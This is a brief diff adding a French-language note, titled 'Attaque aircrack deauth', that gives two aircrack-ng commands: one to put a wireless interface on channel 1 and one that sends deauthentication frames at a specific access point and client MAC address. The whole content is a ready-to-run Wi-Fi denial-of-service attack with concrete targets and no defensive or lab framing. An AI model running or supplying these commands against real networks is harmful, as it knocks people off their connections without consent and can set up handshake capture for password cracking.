@@ -1,0 +1,6 @@
+Attaque aircrack deauth
+-------------------------
+Se mettre sur le channel 1 : sudo airodump-ng --channel 1 wlan0
+
+Lancer l'attaque : aireplay-ng -0 5 -a 8E:48:3A:0D:DD:F1 -c AC:82:47:27:EE:03 wlan0
+
